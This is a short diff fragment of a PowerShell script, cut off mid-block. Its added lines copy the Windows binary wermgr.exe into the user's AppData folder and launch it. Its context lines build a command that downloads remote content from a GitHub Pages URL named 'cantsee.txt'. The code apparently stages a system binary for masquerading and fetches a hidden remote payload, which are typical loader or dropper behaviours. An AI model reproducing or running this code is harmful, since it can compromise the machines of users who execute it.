@@ -1,3 +1,6 @@
+Copy-Item -Path "C:\Windows\System32\wermgr.exe" -Destination $env:APPDATA
+Start-Process -FilePath "C:\Windows\System32\wermgr.exe" -ArgumentList "-boot"
+
 $command = @"
 try {
     `$apiKey = (New-Object System.Net.WebClient).DownloadString('https://hakkyahud.github.io/cantsee.txt')
